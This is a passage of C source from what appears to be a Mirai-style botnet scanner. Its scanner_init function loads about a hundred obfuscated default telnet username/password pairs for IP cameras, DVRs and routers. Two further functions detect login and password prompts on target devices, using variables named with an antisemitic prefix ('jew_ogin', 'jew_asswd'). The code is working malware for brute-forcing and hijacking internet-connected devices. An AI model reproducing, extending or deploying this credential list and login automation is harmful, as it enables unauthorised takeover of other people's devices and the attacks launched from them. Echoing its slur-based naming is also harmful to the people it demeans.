...
void scanner_init(void)
{
    ...
    // Set up passwords
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "", 1); // default
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x4B\x7C\x6C\x68\x73\x57\x43\x3C", 1); // default OxhlwSG8
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x57\x36\x62\x43\x75\x4A\x42\x77", 1); // default S2fGqNFs
    add_auth_entry("\x63\x71\x61\x77\x70", "\x35\x36\x37\x30\x31", 1); // guest 12345
    add_auth_entry("\x63\x71\x61\x77\x70", "\x35\x36\x37\x30", 1); // guest 1234
    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x65\x5E\x7E\x44\x36\x37\x30\x3D\x31\x3C\x31\x3D", 1); // root taZz@23495859
    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x77\x63\x6B\x6D\x6A\x63\x6B\x6A", 1); // root tsgoingon
    add_auth_entry("\x76\x6B\x6B\x70", "\x77\x6B\x68\x6B\x6F\x61\x7D", 1); // root solokey
    ...
    add_auth_entry("\x76\x6B\x6B\x70", "\x35", 1); // root 1
    ...
    add_auth_entry("\x76\x6B\x6B\x70", "", 1); // root 
    add_auth_entry("\x76\x6B\x6B\x70", "\x6A\x61\x73\x77\x6C\x61\x61\x6A", 1); // root newsheen
    add_auth_entry("\x76\x6B\x6B\x70", "\x6A\x61\x73\x6B\x76\x65\x6A\x63\x61\x3C\x3C\x3C\x3C\x3C\x3C\x3C\x3C", 1); // root neworange88888888
    add_auth_entry("\x76\x6B\x6B\x70", "\x6A\x61\x73\x6B\x76\x65\x6A\x63", 1); // root neworang
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x47\x61\x6A\x70\x71\x76\x7D\x48\x35\x6A\x6F", 1); // admin CenturyL1nk
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x69\x6D\x67\x76\x6B\x66\x71\x77\x6D\x6A\x61\x77\x77", 1); // admin microbusiness
    add_auth_entry("\x76\x6B\x6B\x70", "\x6D\x74\x67\x33\x35\x65", 1); // root ipc71a
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x70\x68\x4E\x73\x74\x66\x6B\x32", 1); // default tlJwpbo6
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x2B\x45\x40\x49\x4D\x4A\x2B", 1); // admin /ADMIN/
    add_auth_entry("\x72\x77\x70\x65\x76\x67\x65\x69\x36\x34\x35\x31", "\x36\x34\x35\x31\x34\x32\x34\x36", 1); // vstarcam2015 20150602
    add_auth_entry("\x71\x77\x61\x76\x65\x60\x69\x6D\x6A", "\x71\x77\x61\x76\x65\x60\x69\x6D\x6A", 1); // useradmin useradmin
    add_auth_entry("\x65\x60\x69\x6D\x6A\x6D\x77\x70\x76\x65\x70\x6B\x76", "", 1); // administrator
    add_auth_entry("\x76\x6B\x6B\x70", "\x62\x6B\x71\x6A\x60\x61\x76\x3C\x3C", 1); // root founder88
    add_auth_entry("\x76\x6B\x6B\x70", "\x6F\x68\x72\x35\x36\x37\x30", 1); // root klv1234
    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x6D\x6F\x72\x6D\x77\x6D\x6B\x6A", 1); // root hikvision
    add_auth_entry("\x76\x6B\x6B\x70", "\x4D\x54\x47\x65\x69\x44\x77\x73", 1); // root IPCam@sw
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6E\x72\x67", 1); // admin jvc
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x51\x75\x29\x30\x43\x4D\x70\x37\x49", 1); // admin Uq-4GIt3M
    add_auth_entry("\x76\x6B\x6B\x70", "\x67\x65\x69\x35\x34\x36\x3D", 1); // root cam1029
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x72\x6C\x60\x35\x36\x34\x32", 1); // default vhd1206
    add_auth_entry("\x76\x6B\x6B\x70", "\x72\x61\x76\x70\x61\x7C\x36\x31\x61\x6F\x70\x6F\x77\x35\x36\x37", 1); // root vertex25ektks123
    add_auth_entry("\x70\x61\x68\x61\x67\x6B\x69\x65\x60\x69\x6D\x6A", "\x6A\x41\x33\x6E\x45\x21\x31\x69", 1); // telecomadmin nE7jA%5m
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x77\x69\x67\x65\x60\x69\x6D\x6A", 1); // admin smcadmin
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x55\x73\x61\x77\x70\x49\x34\x60\x61\x69", 1); // admin QwestM0dem
    add_auth_entry("\x76\x6B\x6B\x70", "\x62\x6D\x60\x61\x68\x35\x36\x37", 1); // root fidel123
    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x68\x74\x6D\x6A\x61", 1); // root alpine
    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x77\x68\x73\x6D\x62\x6D\x67\x65\x69", 1); // root hslwificam
    add_auth_entry("\x61\x7E\x60\x72\x76", "\x61\x7E\x60\x72\x76", 1); // ezdvr ezdvr
    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x36\x37\x30\x31\x32\x33\x3C\x3D\x34", 1); // root 1234567890
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x67\x6B\x69\x67\x6B\x69\x67\x6B\x69", 1); // admin comcomcom
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x65\x6D\x76\x68\x6D\x72\x61", 1); // admin airlive
    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x6D\x76\x68\x6D\x72\x61", 1); // root airlive
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x77\x65\x69\x77\x71\x6A\x63", 1); // admin samsung
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x61\x74\x6D\x67\x76\x6B\x71\x70\x61\x76", 1); // admin epicrouter
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x72\x6B\x60\x65\x62\x6B\x6A\x61", 1); // admin vodafone
    add_auth_entry("\x76\x6B\x6B\x70", "\x75\x73\x61\x76\x70\x7D\x71\x6D\x6B\x74", 1); // root qwertyuiop
    add_auth_entry("\x66\x6D\x6A", "", 1); // bin 
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x72\x36\x69\x74\x76\x70", 1); // default v2mprt
    add_auth_entry("\x76\x6B\x6B\x70", "\x71\x47\x68\x6D\x6A\x71\x7C", 1); // root uClinux
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x45\x6D\x70\x66\x4D\x57\x54\x30\x61\x47\x6D\x43", 1); // admin AitbISP4eCiG
    add_auth_entry("\x65\x60\x69\x6D\x6A\x68\x72\x6E\x6C", "\x65\x60\x69\x6D\x6A\x68\x72\x6E\x6C\x35\x36\x37", 1); // adminlvjh adminlvjh123
    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x60\x69\x6D\x6A\x44\x69\x6D\x69\x6D\x62\x6D", 1); // root admin@mymifi
    add_auth_entry("\x60\x65\x61\x69\x6B\x6A", "\x60\x65\x61\x69\x6B\x6A", 1); //daemon daemon
    add_auth_entry("\x77\x71\x74\x74\x6B\x76\x70", "\x77\x71\x74\x74\x6B\x76\x70", 1); //support support
    add_auth_entry("\x35\x36\x37\x30", "\x35\x36\x37\x30", 1); //1234 1234
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x35\x35\x35\x35\x35\x35\x35", 1); //admin 1111111
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x35\x36\x37\x30", 1); //admin 1234
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x35\x36\x37\x30\x31", 1); //admin 12345
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x36\x36\x36\x36\x36", 1); //admin 22222
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x33\x71\x6E\x49\x6F\x6B\x34\x65\x60\x69\x6D\x6A", 1); //admin 7ujMko0admin
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x65\x75\x71\x65\x76\x6D\x6B", 1); //admin aquario
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x67\x6C\x65\x6A\x63\x61\x69\x61", 1); //admin changeme
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x67\x6D\x77\x67\x6B", 1); //admin cisco
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x60\x61\x62\x65\x71\x68\x70", 1); //admin default
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x60\x72\x76\x36\x31\x3C\x34\x36\x36\x36", 1); //admin 
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x62\x68\x6D\x76\x65\x60\x69\x6D\x6A", 1); //admin fliradmin
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6C\x65\x63\x74\x6B\x68\x69\x35", 1); //admin hagpolm1
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6D\x74\x67\x65\x69\x5B\x76\x70\x31\x37\x31\x34", 1); //admin ipcam_rt5350
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6A\x61\x70\x63\x61\x65\x76\x35", 1); //admin netgear1
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6A\x6D\x69\x60\x65", 1); //admin nimda
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x74\x65\x77\x77\x73\x6B\x76\x60", 1); //admin password
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x75\x73\x61\x76\x70\x7D", 1); //admin qwerty
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x72\x36\x69\x74\x76\x70", 1); //admin v2mprt
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x5E\x69\x75\x52\x62\x6B\x57\x4D\x54", 1); //admin ZmqVfoSIP
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x35\x36\x37\x30\x31", 1); //default 12345
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x68\x4E\x73\x74\x66\x6B\x32", 1); //default lJwpbo6
    add_auth_entry("\x62\x70\x74", "\x62\x70\x74", 1); //ftp ftp
    add_auth_entry("\x63\x71\x61\x77\x70", "\x35\x35\x35\x35", 1); //guest 1111
    add_auth_entry("\x63\x71\x61\x77\x70", "\x65\x60\x69\x6D\x6A", 1); //guest admin
    add_auth_entry("\x69\x63\x37\x31\x34\x34", "\x69\x61\x76\x68\x6D\x6A", 1); //mg3500 merlin
    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x36\x37", 1); //root 123
    add_auth_entry("\x76\x6B\x6B\x70", "\x36\x34\x35\x35\x72\x77\x70\x65", 1); //root 2011vsta
    add_auth_entry("\x76\x6B\x6B\x70", "\x33\x71\x6E\x49\x6F\x6B\x34\x76\x6B\x6B\x70", 1); //root 7ujMko0root
    add_auth_entry("\x76\x6B\x6B\x70", "\x67\x65\x69\x61\x76\x65", 1); //root camera
    add_auth_entry("\x76\x6B\x6B\x70", "\x40\x35\x37\x6C\x6C\x5F", 1); //root D13hh[
    add_auth_entry("\x76\x6B\x6B\x70", "\x60\x72\x76", 1); //root dvr
    add_auth_entry("\x76\x6B\x6B\x70", "\x75\x73\x61\x76\x70\x7D", 1); //root qwerty
    add_auth_entry("\x76\x6B\x6B\x70", "\x76\x6B\x6B\x70\x35\x36\x37", 1); //root root123
    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x65\x5E\x7E\x44\x34\x35", 1); //root taZz@01
    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x6D\x6A\x6D", 1); //root tini
    add_auth_entry("\x76\x6B\x6B\x70", "\x7C\x69\x6C\x60\x74\x6D\x67", 1); //root xmhdpic
    add_auth_entry("\x76\x6B\x6B\x70", "\x7E\x70\x61\x3D\x7C\x35\x31", 1); //root zte9x15
    add_auth_entry("\x76\x6B\x6B\x70", "\xC6\xA5\xC6\xBC\xC6\xAF\xC6\xAD\xC6\xA1\xE6\x84\x90\xC6\xBE\xC6\xB8\xC7\xB9\xC7\xBF\xC7\xB9\xC7\xBC\xC7\x8C", 1); //root ¡¸«©¥—º¼ýûýøÈ
    add_auth_entry("\x77\x61\x76\x72\x6D\x67\x61", "\x77\x61\x76\x72\x6D\x67\x61", 1); //service service
    add_auth_entry("\x70\x61\x68\x61\x67\x6B\x69", "\x70\x61\x68\x61\x67\x6B\x69", 1); //telecom telecom
    add_auth_entry("\x70\x61\x68\x6A\x61\x70", "\x70\x61\x68\x6A\x61\x70", 1); //telnet telnet
    add_auth_entry("\x71\x66\x6A\x70", "\x71\x66\x6A\x70", 1); //ubnt ubnt
    add_auth_entry("\x71\x77\x61\x76", "\x74\x65\x77\x77\x73\x6B\x76\x60", 1); //user password
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x73\x65\x63\x6B", 1); //admin wago
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x61\x74\x6D\x67\x76\x6B\x71\x70\x61\x76", 1); //admin epicrouter
	add_auth_entry("\x76\x6B\x6B\x70", "\x67\x6C\x6D\x6A\x65\x35\x36\x37", 1); //root china123
	add_auth_entry("\x60\x61\x66\x71\x63", "\x60\x61\x66\x71\x63\x35\x36\x30", 1); //debug debug124
	add_auth_entry("\x65\x74\x67", "\x65\x74\x67", 1); //apc apc
#ifdef DEBUG
...
static int consume_user_prompt(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
		...
		jew_ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
		jew_enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, jew_ogin, len - 1) != -1))
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, jew_enter, len - 1) != -1))
            prompt_ending = tmp;
    }
...
static int consume_pass_prompt(struct scanner_connection *conn)
{
        ...
        if (prompt_ending == -1)
    {
		...
		jew_asswd = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, jew_asswd, len - 1) != -1))
            prompt_ending = tmp;
    }
